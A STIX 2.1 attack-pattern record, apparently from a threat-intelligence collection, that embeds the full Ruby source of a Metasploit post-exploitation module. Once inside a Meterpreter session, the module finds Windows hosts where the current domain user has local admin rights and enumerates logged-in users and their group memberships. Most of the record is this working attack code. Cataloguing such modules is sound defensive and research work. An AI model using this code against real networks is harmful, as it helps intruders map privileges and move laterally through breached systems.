{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9dd8467-5a4a-4efd-bdf1-340db7950372",
    "created": "2024-08-14T16:33:05.046869Z",
    "modified": "2024-08-14T16:33:05.046872Z",
    "name": "Windows Gather Local Admin Search",
    "description": " This module will identify systems in a given range that the supplied domain user (should migrate into a user pid) has administrative access to by using the Windows API OpenSCManagerA to establishing a handle to the remote host. Additionally it can enumerate logged in users and group membership via Windows API NetWkstaUserEnum and NetUserGetGroups.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/local_admin_search_enum.rb",
            "external_id": "local_admin_search_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Local Admin Search',\n        'Description' => %q{\n          This module will identify systems in a given range that the\n          supplied domain user (should migrate into a user pid) has administrative\n          access to by using the Windows API OpenSCManagerA to establishing a handle\n          to the remote host. Additionally it can enumerate logged in users and group\n          membership via Windows API NetWkstaUserEnum and NetUserGetGroups.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>',\n          'Thomas McCarthy \"smilingraccoon\" <smilingraccoon[at]gmail.com>',\n          'Royce Davis \"r3dy\" <rdavis[at]accuvant.com>'\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_railgun_memread\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('ENUM_USERS', [ true, 'Enumerates logged on users.', true]),\n        OptBool.new('ENUM_GROUPS', [ false, 'Enumerates groups for identified users.', true]),\n        OptString.new('DOMAIN', [false, 'Domain to enumerate user\\'s groups for']),\n        OptString.new('DOMAIN_CONTROLLER', [false, 'Domain Controller to query groups'])\n      ]\n    )\n  end\n\n  def setup\n    super\n\n    # This datastore option can be modified during runtime.\n    # Saving it here so the modified value remains with this module.\n    @domain_controller = datastore['DOMAIN_CONTROLLER']\n\n    if is_system?\n      # running as SYSTEM and will not pass any network credentials\n      print_error 'Running as SYSTEM, module should be run with USER level rights'\n      return\n    else\n      @adv = client.railgun.advapi32\n\n      # Get domain and domain controller if options left blank\n      if datastore['DOMAIN'].nil? || datastore['DOMAIN'].empty?\n        user = client.sys.config.getuid\n        datastore['DOMAIN'] = user.split('\\\\')[0]\n      end\n\n      if @domain_controller.nil? && datastore['ENUM_GROUPS']\n        @dc_error = false\n\n        # Uses DC which applied policy since it would be a DC this device normally talks to\n        cmd = 'gpresult /SCOPE COMPUTER'\n        # If Vista/2008 or later add /R\n        version = get_version_info\n        if version.build_number >= Msf::WindowsVersion::Vista_SP0\n          cmd << ' /R'\n        end\n        res = cmd_exec('cmd.exe', \"/c #{cmd}\")\n\n        # Check if RSOP data exists, if not disable group check\n        if res =~ /does not have RSOP data./\n          @dc_error = true\n          print_error('User never logged into device, will not enumerate users and groups. Manually specify DC.')\n        else\n          dc_applied = /Group Policy was applied from:\\s*(.*)\\s*/.match(res)\n          if dc_applied\n            @domain_controller = dc_applied[1].strip\n          else\n            @dc_error = true\n            print_error('Could not read RSOP data, will not enumerate users and groups. Manually specify DC.')\n          end\n        end\n      end\n    end\n  end\n\n  # main control method\n  def run_host(ip)\n    connect(ip)\n  end\n\n  # http://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85).aspx\n  # enumerate logged in users\n  def enum_users(host)\n    userlist = Array.new\n\n    begin\n      # Connect to host and enumerate logged in users\n      winsessions = client.railgun.netapi32.NetWkstaUserEnum(\"\\\\\\\\#{host}\", 1, 4, -1, 4, 4, nil)\n    rescue ::Exception\n      print_error(\"Issue enumerating users on #{host}\")\n      return userlist\n    end\n\n    return userlist if winsessions.nil?\n\n    count = winsessions['totalentries'] * 2\n    startmem = winsessions['bufptr']\n\n    base = 0\n    userlist = Array.new\n    begin\n      mem = client.railgun.memread(startmem, 8 * count)\n    rescue ::Exception => e\n      print_error(\"Issue reading memory for #{host}\")\n      vprint_error(e.to_s)\n      return userlist\n    end\n    # For each entry returned, get domain and name of logged in user\n    begin\n      count.times do |_i|\n        temp = {}\n        userptr = mem[(base + 0), 4].unpack('V*')[0]\n        temp[:user] = client.railgun.memread(userptr, 255).split(\"\\0\\0\")[0].split(\"\\0\").join\n        nameptr = mem[(base + 4), 4].unpack('V*')[0]\n        temp[:domain] = client.railgun.memread(nameptr, 255).split(\"\\0\\0\")[0].split(\"\\0\").join\n\n        # Ignore if empty or machine account\n        unless temp[:user].empty? || (temp[:user][-1, 1] == '$')\n\n          # Check if enumerated user's domain matches supplied domain, if there was\n          # an error, or if option disabled\n          data = ''\n          if (datastore['DOMAIN'].upcase == temp[:domain].upcase) && !@dc_error && datastore['ENUM_GROUPS']\n            data << \" - Groups: #{enum_groups(temp[:user]).chomp(', ')}\"\n          end\n          line = \"\\tLogged in user:\\t#{temp[:domain]}\\\\#{temp[:user]}#{data}\\n\"\n\n          # Write user and groups to notes database\n          db_note(host, \"#{temp[:domain]}\\\\#{temp[:user]}#{data}\", 'localadmin.user.loggedin')\n          userlist << line unless userlist.include? line\n\n        end\n\n        base += 8\n      end\n    rescue ::Exception => e\n      print_error(\"Issue enumerating users on #{host}\")\n      vprint_error(e.backtrace)\n    end\n    return userlist\n  end\n\n  # http://msdn.microsoft.com/en-us/library/windows/desktop/aa370653(v=vs.85).aspx\n  # Enumerate groups for identified users\n  def enum_groups(user)\n    grouplist = ''\n\n    dc = \"\\\\\\\\#{@domain_controller}\"\n    begin\n      # Connect to DC and enumerate groups of user\n      usergroups = client.railgun.netapi32.NetUserGetGroups(dc, user, 0, 4, -1, 4, 4)\n    rescue ::Exception => e\n      print_error('Issue connecting to DC, try manually setting domain and DC')\n      vprint_error(e.to_s)\n      return grouplist\n    end\n\n    count = usergroups['totalentries']\n    startmem = usergroups['bufptr']\n    base = 0\n\n    begin\n      mem = client.railgun.memread(startmem, 8 * count)\n    rescue ::Exception => e\n      print_error(\"Issue reading memory for groups for user #{user}\")\n      vprint_error(e.to_s)\n      return grouplist\n    end\n\n    begin\n      # For each entry returned, get group\n      count.to_i.times do |i|\n        temp = {}\n        groupptr = mem[(base + 0), 4].unpack('V*')[0]\n        temp[:group] = client.railgun.memread(groupptr, 255).split(\"\\0\\0\")[0].split(\"\\0\").join\n\n        # Add group to string to be returned\n        grouplist << \"#{temp[:group]}, \"\n        if (i % 5) == 2\n          grouplist << \"\\n\\t-   \"\n        end\n        base += 4\n      end\n    rescue ::Exception => e\n      print_error(\"Issue enumerating groups for user #{user}, check domain\")\n      vprint_error(e.backtrace)\n      return grouplist\n    end\n\n    return grouplist.chomp(\"\\n\\t-   \")\n  end\n\n  # http://msdn.microsoft.com/en-us/library/windows/desktop/ms684323(v=vs.85).aspx\n  # method to connect to remote host using windows api\n  def connect(host)\n    if @adv.nil?\n      return\n    end\n\n    user = client.sys.config.getuid\n    # use railgun and OpenSCManagerA api to connect to remote host\n    manag = @adv.OpenSCManagerA(\"\\\\\\\\#{host}\", nil, 0xF003F) # SC_MANAGER_ALL_ACCESS\n\n    if (manag['return'] != 0) # we have admin rights\n      result = \"#{host.ljust(16)} #{user} - Local admin found\\n\"\n      # Run enumerate users on all hosts if option was set\n\n      if datastore['ENUM_USERS']\n        enum_users(host).each do |i|\n          result << i\n        end\n      end\n\n      # close the handle if connection was made\n      @adv.CloseServiceHandle(manag['return'])\n      # Append data to loot table within database\n      print_good(result.chomp(\"\\n\")) unless result.nil?\n      db_loot(host, user, 'localadmin.user')\n    else\n      # we dont have admin rights\n      print_error(\"#{host.ljust(16)} #{user} - No Local Admin rights\")\n    end\n  end\n\n  # Write to notes database\n  def db_note(host, data, type)\n    report_note(\n      type: type,\n      data: data,\n      host: host,\n      update: :unique_data\n    )\n  end\n\n  # Write to loot database\n  def db_loot(host, user, type)\n    p = store_loot(type, 'text/plain', host, \"#{host}:#{user}\", 'hosts_localadmin.txt', user)\n    vprint_good(\"User data stored in: #{p}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}